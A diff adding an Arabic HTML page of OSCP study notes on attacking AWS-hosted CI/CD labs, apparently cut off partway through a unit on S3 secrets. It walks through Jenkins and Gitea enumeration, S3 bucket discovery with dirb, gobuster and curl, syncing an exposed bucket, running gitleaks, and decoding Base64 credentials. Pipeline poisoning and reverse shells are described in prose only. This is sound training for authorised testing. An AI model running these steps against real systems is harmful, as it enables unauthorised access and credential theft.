@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 23: مهاجمة بنية AWS السحابية</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout ul{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-23$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 23</span>
+    <h1>مهاجمة بنية AWS السحابية (Attacking AWS Cloud Infrastructure)</h1>
+    <p class="lede">من استكشاف تطبيق ويب هادئ الظاهر — إلى سلسلة اختراق كاملة عبر S3 Misconfiguration، تسريب أسرار Git، تسميم CI/CD Pipeline، هجوم Dependency Chain، ووصولًا للـ Pivoting الداخلي بين حاويات الإنتاج.</p>
+    <div class="tags">
+      <span class="tag">ci-cd</span>
+      <span class="tag">jenkins</span>
+      <span class="tag">gitea</span>
+      <span class="tag">s3-misconfig</span>
+      <span class="tag">pipeline-poisoning</span>
+      <span class="tag">dependency-chain</span>
+      <span class="tag">container-escape</span>
+      <span class="tag">aws-pivoting</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>مشهد تهديدات CI/CD Pipeline</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>بيئة المعمل</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>تعداد سيرفر الأتمتة (Jenkins)</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>تعداد سيرفر Git (Gitea)</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>تعداد التطبيق الهدف</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>اكتشاف أسرار S3 Bucket</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span>تسميم CI/CD Pipeline</span></a>
+  <a class="toc-item" href="#lu8"><span class="toc-num">08</span><span>تعداد Build Agent</span></a>
+  <a class="toc-item" href="#lu9"><span class="toc-num">09</span><span>حزمة Python خبيثة</span></a>
+  <a class="toc-item" href="#lu10"><span class="toc-num">10</span><span>ما بعد الاستغلال وPivoting</span></a>
+  <a class="toc-item" href="#methodology"><span class="toc-num">--</span><span>سلسلة الهجوم الكاملة</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">مشهد تهديدات CI/CD Pipeline</span></h2>
+
+<h3>ليه الـ Pipelines هدف أساسي للمهاجمين</h3>
+<p>الـ Pipelines بتؤتمت بناء التطبيقات واختبارها ونشرها — وعشان تعمل كده، بتحتاج وصول واسع لكل حاجة في البيئة. اختراق Pipeline واحد يعني وراثة كل صلاحياته.</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>مستودعات الكود المصدري (Source Code Repositories)</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>بيانات اعتماد الخدمات السحابية (AWS keys، tokens)</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>بيئات النشر (Staging، Production)</span></div>
+  <div class="goal-card"><span class="gi">4</span><span>سجلات الحاويات ومخازن الـ Artifacts</span></div>
+</div>
+
+<h3>OWASP CI/CD Security Top 10</h3>
+<ul>
+<li>Insufficient Flow Control Mechanisms</li>
+<li>Inadequate Identity and Access Management</li>
+<li>Dependency Chain Abuse</li>
+<li>Poisoned Pipeline Execution (PPE)</li>
+<li>Insufficient Pipeline-Based Access Controls (PBAC)</li>
+<li>Insufficient Credential Hygiene</li>
+<li>Insecure System Configuration</li>
+<li>Ungoverned Usage of Third-Party Services</li>
+</ul>
+
+<h3>Poisoned Pipeline Execution — المفهوم الجوهري</h3>
+<p>المهاجم بيتلاعب في سكريبتات البناء أو النشر، فتتنفّذ أوامر خبيثة أثناء تشغيل الـ Pipeline تلقائيًا. الـ Pipeline نفسه بيتحوّل لناقل الهجوم.</p>
+<div class="callout warning">
+<div class="callout-label">إمكانيات ما بعد التسميم</div>
+<p>تسريب الأسرار ومتغيرات البيئة، فتح Reverse Shell على سيرفر البناء، حقن كود خبيث في عمليات النشر الإنتاجية، أو الـ Pivot للبنية السحابية باستخدام بيانات اعتماد الـ Pipeline نفسه.</p>
+</div>
+
+<h3>Dependency Chain Abuse</h3>
+<p>نشر حزمة خبيثة بتقلّد Dependency شرعية — نظام البناء بيحمّلها وينفّذها تلقائيًا. بمجرد تشغيل الحزمة المخترَقة جوه الـ Pipeline: فحص الشبكات الداخلية، التحرّك الجانبي لبنية تحتية تانية، أو الوصول لملفات Terraform state اللي فيها مفاتيح عالية الصلاحية.</p>
+<div class="callout danger">
+<div class="callout-label">نقطة حرجة</div>
+<p>سلسلة التوريد (Supply Chain) نفسها بتتحوّل لآلية توصيل الحمولة.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">بيئة المعمل</span></h2>
+
+<h3>مكوّنات المعمل</h3>
+<ul>
+<li><strong>Source Code Management:</strong> Gitea — منصة Git ذاتية الاستضافة، بتعكس أنظمة SCM المؤسسية الحقيقية، وبتخزّن كود التطبيق وتعريفات الـ Pipeline</li>
+<li><strong>CI/CD Automation:</strong> Jenkins — بينسّق عمليات البناء والنشر، وبيحتفظ ببيانات اعتماد سحابية تستخدمها الـ Pipelines</li>
+<li><strong>Target Application:</strong> تطبيق ويب إنتاجي شغّال، بيستخدم AWS S3 لاستضافة المحتوى الثابت</li>
+<li><strong>البنية المساندة:</strong> DNS، وجهاز المهاجم (Kali)</li>
+</ul>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 150" xmlns="http://www.w3.org/2000/svg">
+  <rect x="5" y="55" width="100" height="55" rx="7" class="dsvg-box-r"/>
+  <text x="55" y="78" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">Kali</text>
+  <text x="55" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">المهاجم</text>
+
+  <rect x="150" y="55" width="100" height="55" rx="7" class="dsvg-box"/>
+  <text x="200" y="78" text-anchor="middle" class="dsvg-txt" font-size="11" font-weight="700">DNS</text>
+  <text x="200" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">اكتشاف النطاق</text>
+
+  <rect x="295" y="55" width="100" height="55" rx="7" class="dsvg-box-b"/>
+  <text x="345" y="78" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">Gitea</text>
+  <text x="345" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">SCM</text>
+
+  <rect x="440" y="55" width="100" height="55" rx="7" class="dsvg-box-a"/>
+  <text x="490" y="78" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">Jenkins</text>
+  <text x="490" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">CI/CD</text>
+
+  <rect x="585" y="55" width="110" height="55" rx="7" class="dsvg-box-g"/>
+  <text x="640" y="78" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">AWS</text>
+  <text x="640" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">S3+Lambda+EC2</text>
+
+  <line x1="105" y1="82" x2="150" y2="82" class="dsvg-line"/>
+  <line x1="250" y1="82" x2="295" y2="82" class="dsvg-line"/>
+  <line x1="395" y1="82" x2="440" y2="82" class="dsvg-line"/>
+  <line x1="540" y1="82" x2="585" y2="82" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">بنية المعمل — من المهاجم وحتى بنية AWS الهدف</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">تعداد سيرفر الأتمتة (Jenkins)</span></h2>
+
+<h3>إيه اللي نبحث عنه</h3>
+<ul>
+<li>Jenkins سيرفر أتمتة CI/CD مفتوح المصدر ومنتشر جدًا — حتى من غير مصادقة، التعداد ممكن</li>
+<li>رقم إصدار البرنامج من HTTP headers أو صفحات الأخطاء</li>
+<li>قائمة الـ Endpoints المتاحة والمحمية</li>
+<li>الإصدار → بحث عن CVEs واستغلالات معروفة</li>
+</ul>
+<div class="callout note">
+<div class="callout-label">Metasploit لـ Jenkins</div>
+<p>فيه موديولات مخصّصة لفحص الإصدار الشغّال، تحديد الـ Endpoints المتاحة مقابل المحمية، وتعداد الإضافات (Plugins) المثبّتة.</p>
+</div>
+
+<h3>ليه اكتشاف الإصدار مهم جدًا</h3>
+<ul>
+<li>الإصدار الدقيق → بحث ثغرات موجَّه</li>
+<li>Jenkins كان عنده الكثير من CVEs الحرجة: RCE عبر Script Console (بدون مصادقة في الإصدارات القديمة)، ثغرات حقن Groovy script، وعيوب خاصة بإضافات معيّنة (عشرات تُكتشف سنويًا)</li>
+<li>حتى النسخ المحمية بمصادقة ممكن يكون عندها Bypass معروف</li>
+</ul>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">تعداد سيرفر Git (Gitea)</span></h2>
+
+<h3>السحابي مقابل ذاتي الاستضافة</h3>
+<div class="method-grid">
+<div class="method-card"><span class="mnum">Cloud</span><div class="mtitle">GitHub / GitLab</div><div class="mdesc">التركيز على OSINT فقط — المستودعات العامة، سجل الـ Commits، بروفايلات المطوّرين، الأسرار المكشوفة في الـ Commits. <strong>ممنوع مهاجمة المنصة نفسها</strong> — فقط الأصول المملوكة للمؤسسة الهدف، باستخدام Gitleaks وTruffleHog وGitHub Dorking.</div></div>
+<div class="method-card"><span class="mnum">Self-Hosted</span><div class="mtitle">Gitea / GitLab CE</div><div class="mdesc">التعداد التقني داخل النطاق: إصدار البرنامج → بحث CVE، إعدادات مصادقة خاطئة، تعداد المستخدمين عبر API، وتخمين كلمات المرور ممكن (قاعدة مستخدمين صغيرة → هجمات موجَّهة). اكتشاف حساب الأدمن قيمة عالية جدًا.</div></div>
+</div>
+
+<h3>نتائج تعداد Gitea</h3>
+<ul>
+<li>زيارة واجهة الويب وفحص الصفحة الرئيسية بعناية: إصدار البرنامج (أسفل الصفحة أو في HTTP headers)</li>
+<li>قسم "Explore" بيكشف لو فيه مستودعات عامة</li>
+<li>قسم "Users" بيكشف أسماء مستخدمين صالحة — حتى من غير بيانات اعتماد، تعداد المستخدمين بينجح</li>
+</ul>
+<div class="callout tip">
+<div class="callout-label">أهمية الأسماء المكشوفة</div>
+<p>أسماء المستخدمين الظاهرة (موظفين عاديين + حساب أدمن) بتتحوّل لأهداف مباشرة لهجمات بيانات الاعتماد.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">تعداد التطبيق الهدف</span></h2>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">اكتشاف المحتوى الآلي</div>
+<div class="step-body"><p>تشغيل <code>dirb</code> على التطبيق الهدف — النتيجة غالبًا محدودة (الصفحة الرئيسية بس)، ده بيدل إما على عدم وجود مجلدات مخفية واضحة، أو إنها محمية/بأسماء غير قياسية. لما الأدوات الآلية تفشل، التحليل اليدوي بيبقى أساسي.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">فحص مصدر HTML</div>
+<div class="step-body"><p>View Page Source (Ctrl+U) بيكشف روابط صور بتشاور على S3 bucket بالنمط <code>https://&lt;bucket&gt;.s3.amazonaws.com/&lt;path&gt;</code> — تأكيد إن المحتوى الثابت بيتقدَّم مباشرة من AWS S3، واسم الـ Bucket بقى معروف.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">فحص الـ S3 Bucket</div>
+<div class="step-body"><p>الوصول لجذر الـ Bucket مباشرة بيرجّع Access Denied (قائمة المجلدات معطّلة) — لكن Access Denied مش معناها آمن. استخدام Wordlist لفحص مسارات مخفية بيكشف مجلد <code>.git/</code> — مستودع Git كامل اتنقل بالغلط لتخزين عام!</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">recon commands</span><pre><code>dirb http://target.com /usr/share/wordlists/dirb/common.txt
+
+curl https://&lt;bucket&gt;.s3.amazonaws.com/
+# Access Denied — لكن مش آمن بالضرورة
+
+gobuster dir -u https://&lt;bucket&gt;.s3.amazonaws.com/ -w wordlist.txt
+# اكتشاف حرج: .git/ موجود!
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">اكتشاف أسرار S3 Bucket</span></h2>
+
+<h3>ليه مجلد .git حرج جدًا</h3>
+<ul>
+<li>مجلد <code>.git</code> = مستودع Git كامل بكل تاريخه — الكود الحالي، ملفات الإعداد، <strong>كل</strong> النسخ السابقة (كل Commit اتعمل)، سير عمل المطوّرين والتوثيق الداخلي</li>
+<li>Git <strong>أبدًا</strong> مش بيحذف التاريخ فعليًا — أسرار اتشالت من ملف حالي لسه موجودة في Commits أقدم</li>
+</ul>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">سرد محتويات الـ Bucket</div>
+<div class="step-body"><p>استخدام AWS CLI (بعد المصادقة) لسرد الـ Bucket — بيكشف <code>.git/</code>، <code>Jenkinsfile</code>، <code>docker-compose.yml</code>، ومجلد <code>scripts/</code>.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">تحميل ملفات محددة</div>
+<div class="step-body"><p><code>aws s3 cp s3://bucket/README.md ./</code> — يؤكد صلاحية القراءة، وبيكشف أسماء المتعاونين وسير العمل.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تحميل كامل بالمزامنة</div>
+<div class="step-body"><p><code>aws s3 sync s3://bucket-name ./local/</code> — بينسخ كل حاجة بما فيها أوبجكتس .git المخفية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">فحص السكريبتات</div>
+<div class="step-body"><p>السكريبتات غالبًا فيها أسماء AWS profiles، بيانات اعتماد، استدعاءات API، وروابط نقاط نهاية داخلية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">فحص بـ Gitleaks</div>
+<div class="step-body"><p>فحص آلي لتاريخ المستودع بالكامل — بيكتشف مفاتيح API وTokens وبيانات اعتماد مكشوفة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">فك ترميز النتائج يدويًا</div>
+<div class="step-body"><p>رؤوس HTTP Basic Auth مرمّزة بـ Base64 جوه السكريبتات → فك الترميز بيكشف اسم مستخدم:كلمة مرور الأدمن.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">s3 + gitleaks workflow</span><pre><code>aws s3 ls s3://bucket-name/
+aws s3 sync s3://bucket-name ./local/
+gitleaks detect --source ./local/ -v
+</code></pre></div>
+
+<div class="callout danger">
